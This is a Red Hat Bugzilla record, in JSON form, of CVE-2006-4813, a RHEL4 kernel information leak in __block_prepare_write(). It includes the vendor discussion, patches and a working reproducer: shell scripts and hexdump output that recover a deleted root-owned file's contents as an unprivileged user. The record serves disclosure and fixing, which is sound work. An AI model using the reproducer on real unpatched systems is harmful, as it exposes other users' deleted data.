{
    "bugid": "207463",
    "cveid": [
        "CVE-2006-4813"
    ],
    "summary": "CVE-2006-4813 Information leak in __block_prepare_write()",
    "alias": "None",
    "product": "Red Hat Enterprise Linux 4",
    "hardware": "All",
    "os": "Linux",
    "url": "",
    "reported_date": "2006-09-21 08:52 UTC byVasily Averin",
    "attachment": [
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=136834",
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=136835",
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=136836"
    ],
    "comment": [
        "Dmitriy Monakhov from SWsoft Virtuozzo/OpenVZ Linux Team has noticed an\ninformation leak in __block_prepare_write() affected RHEL4 kernels:\n__block_prepare_write() does not clear properly the data buffers during error\nrecovery and therefore content of previously unliked files is accessible.\n\nIt is known issue and it is fixed in mainstream by following patch:http://www.kernel.org/git/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=152becd26e0563aefdbc4fd1fe491928efe92d1f",
        "#uname -r\n2.6.9-42.0.2.EL\n\nto reproduce:\n\ngcc -Wall ./open_write.c -o /tmp/open_write\nsh ./prep.sh\nsh ./info_leack_test.sh\n\ntest result:\n#sh  /tmp/info_leack_test.sh\nstat: cannot stat `/mnt/file': No such file or directory\n00000000  53 53 53 53 53 53 53 53  53 53 53 53 53 53 53 53  |SSSSSSSSSSSSSSSS|\n*\n########## content from unlinked file visible.      ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n########## must be zeros here \n00000800  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00001000  6e                                                |n|\n00001001",
        "Createdattachment 136834[details]reproducer testcase",
        "Createdattachment 136835[details]reproducer preapre script",
        "Createdattachment 136836[details]reproducer testcase script",
        "an you elaborate a little bit more on this issue. The reproduce needs root\nrights to fully work and a root-only information leak is not a security issue.",
        "root permission in this reproducer needs for filesystem preparing only.\nthen root (or any another user) may write some files, then delete it.\nThen any another user have a chance to get content of _any_  previously deleted\nfiles.",
        "please show:\n\n-bash-3.00# cd /tmp\n-bash-3.00# ls prepvvs.sh -al\n-rw-r--r--  1 root root 653 Sep 22 11:46 prepvvs.sh\n\n-bash-3.00# cat prepvvs.sh\n#############\nDEV=/tmp/FS_test\nMNT=/tmp/mnt\nmkdir $MNT\n\n#preparing a filesystem; it should have 1k or 2k blocksize\ndd if=/dev/zero of=$DEV bs=1M count=128\n\nmkfs.ext2 -b1024 -m0 -q  -F $DEV\nmount $DEV $MNT -oloop\n\n#make filesystem pubic accessible\nchmod 777 $MNT\n\n# create private root directory\nmkdir $MNT/root\nchmod 700 $MNT/root\n\n# write to file top secret data\nfor(( i = 0; i< 96; i++ ))\n        do\n                echo \"top secret root  file content  \" >> $MNT/root/ROOT_FILE\n        done\n#fill up the filesystem\ndd if=/dev/zero of=$MNT/root/BIG bs=1k\nsync\n\n#unlink root's file\nunlink  $MNT/root/ROOT_FILE\nsync\n# now filesystem has 3 free data blocks with content of unlinked ROOT_FILE\n\n-bash-3.00# sh ./prepvvs.sh\n128+0 records in\n128+0 records out\ndd: writing `/tmp/mnt/root/BIG': No space left on device\n124887+0 records in\n124886+0 records out\n\n\n-bash-3.00# su testuser\n\n[testuser@dmon tmp]$ ls -al ./userscript.sh\n-rw-r--r--  1 testuser testuser 218 Sep 22 11:40 ./userscript.sh\n\n[testuser@dmon tmp]$ cat userscript.sh\n## create sparse file\ndd if=/dev/zero of=/tmp/mnt/userfile seek=4096 count=1 bs=1\n## and fill it\ndd if=/dev/zero of=/tmp/mnt/userfile bs=4k count=1 conv=notrunc\n## now look what we get\nhexdump  -C /tmp/mnt/userfile\n\n[testuser@dmon tmp]$ sh ./userscript.sh\n1+0 records in\n1+0 records out\ndd: writing `/tmp/mnt/userfile': No space left on device\n1+0 records in\n0+0 records out\n00000000  74 6f 70 20 73 65 63 72  65 74 20 72 6f 6f 74 20  |top secret root |\n00000010  20 66 69 6c 65 20 63 6f  6e 74 65 6e 74 20 20 0a  | file content  .|\n00000020  74 6f 70 20 73 65 63 72  65 74 20 72 6f 6f 74 20  |top secret root |\n00000030  20 66 69 6c 65 20 63 6f  6e 74 65 6e 74 20 20 0a  | file content  .|\n00000040  74 6f 70 20 73 65 63 72  65 74 20 72 6f 6f 74 20  |top secret root |\n00000050  20 66 69 6c 65 20 63 6f  6e 74 65 6e 74 20 20 0a  | file content  .|\n...\n000007a0  74 6f 70 20 73 65 63 72  65 74 20 72 6f 6f 74 20  |top secret root |\n000007b0  20 66 69 6c 65 20 63 6f  6e 74 65 6e 74 20 20 0a  | file content  .|\n000007c0  74 6f 70 20 73 65 63 72  65 74 20 72 6f 6f 74 20  |top secret root |\n000007d0  20 66 69 6c 65 20 63 6f  6e 74 65 6e 74 20 20 0a  | file content  .|\n000007e0  74 6f 70 20 73 65 63 72  65 74 20 72 6f 6f 74 20  |top secret root |\n000007f0  20 66 69 6c 65 20 63 6f  6e 74 65 6e 74 20 20 0a  | file content  .|\n00000800  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00001000  00                                                |.|\n00001001",
        "The patch is public since June, 23th 2005, but the security implication is not\nwide spreaded. Do you mind keeping this embargoed for 1-2 weeks and me sending\nthis information (including reproducer) to vendor-sec?",
        "I'm agree,\nI would like to add that information may leaks even when user is limited by disk\nquota.",
        "Backported patch sent to rhkernel-list on 10/2/06",
        "Eric,\ncan I take a look at this patch somehow please?\nIs it possible to get subscribed to rhkernel-list@? We (Virtuozzo/OpenVZ team)\nreport bugs to RHEL kernels and could provide much better level of cooperation\nand feedback (including patches) having an access to this mailing list. Whom can\nI ask for it?",
        "Vasily, if they are security related, I prefer you post the information to\nvendor-sec. This allows all distributions to comment on it and I can pick\nthem up from there.\n\nI spoke with Kir Kolyshkin at IBLOC about it and once I am back, I am going to\nwrite something up. I first have to check what is possible and what not.",
        "committed in stream U5 build 42.19. A test kernel with this patch is available\nfromhttp://people.redhat.com/~jbaron/rhel4/",
        "This request was evaluated by Red Hat Product Management for inclusion in a Red\nHat Enterprise Linux maintenance release.  Product Management has requested\nfurther review of this request by Red Hat Engineering, for potential\ninclusion in a Red Hat Enterprise Linux Update release for currently deployed\nproducts.  This request is not yet committed for inclusion in an Update\nrelease.",
        "QE ack for 4.5.",
        "committed in stream E5 build 42.0.4",
        "sucessfully tested with the second rendition of the test case (the first didn't\nseem to work). no deleted files were visable with the 42.0.6 kernel.",
        "An advisory has been issued which should help the problem\ndescribed in this bug report. This report is therefore being\nclosed with a resolution of ERRATA. For more information\non the solution and/or where to find the updated files,\nplease follow the link below. You may reopen this bug report\nif the solution does not work for you.http://rhn.redhat.com/errata/RHSA-2007-0014.html",
        "patch you applied is _incorrect_.\nActually __block_prepare_write err path was broken in two places:\n\nA)clear_buffer_new() was called too early and result in information leak. [you\nhave fixed it.]\n\nB)after get_block has failed original code  jump to \"out\" label and return\nwithout waiting for issued read requests to complete, and may later unlock page. \nWe must just do \"break\" here, and wait until IO-layer reading complete.\nOtherwise later access to page cause unpredictable result, because IO-layer may\nmodify this page at this moment.\nSo this place have to looks like this:\n=-=-=-=-=-=-=\n--- linux-2.6.9/fs/buffer.c.orig\n+++ linux-2.6.9/fs/buffer.c\n@@ -2029,9 +2029,8 @@ static int __block_prepare_write(struct \n \t\tif (!buffer_mapped(bh)) {\n \t\t\terr = get_block(inode, block, bh, 1);\n \t\t\tif (err)\n-\t\t\t\tgoto out;\n+\t\t\t\tbreak;\n \t\t\tif (buffer_new(bh)) {\n-\t\t\t\tclear_buffer_new(bh);\n \t\t\t\tunmap_underlying_metadata(bh->b_bdev,\n \t\t\t\t\t\t\tbh->b_blocknr);\n \t\t\t\tif (PageUptodate(page)) {\n=-=-=-=-=-=\nI haven't sufficient right access, so than let's someone else REOPEN it.",
        "Createdattachment 147354[details]patch against your lastest public kernel \n\nThis patch fix broken error handling path as it was done in original mainstream\npatch. Waiting for issued read requests to complete.",
        "Thanks, I'll look at this today.",
        "Ok, so it looks like we're missinghttp://www2.kernel.org/git/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=f3ddbdc6267c32223035ea9bb8456a2d86f65ba1Fix a race where __block_prepare_write can leak out an in-flight read\nagainst a bh if get_block returns an error.  This can lead to the page\nbecoming unlocked while the buffer is locked and the read still in flight.\n__mpage_writepage BUGs on this condition.\n\nBUG sighted on a 2-way Itanium2 system with 16K PAGE_SIZE running\n\n\tfsstress -v -d $DIR/tmp -n 1000 -p 1000 -l 2\n\nwhere $DIR is a new ext2 filesystem with 4K blocks that is quite\nsmall (causing get_block to fail often with -ENOSPC).\n\nSigned-off-by: Nick Piggin <nickpiggin.au>",
        "This is a regression with an issue solved through an errata. If the fix in the\nerrata was incomplete, we need to open a new bug for it. Don't re-open this one.",
        "Dmitriy,\n\nIt's my understanding that by putting the patch in as we did, we DID fix one\nproblem case, but still did not fix a 2nd case.  I don't think that we have made\nanything -worse- (i.e. the errata patch did not cause a regression) and the case\nwe missed has been in the RHEL4 kernel since it was released.  I think that this\n2nd problem does have some security implications, although it is not as severe\nas the problem which was addressed with the first patch.  Do you agree with this\nassessment?\n\nThanks,\n-Eric",
        "yes."
    ]
}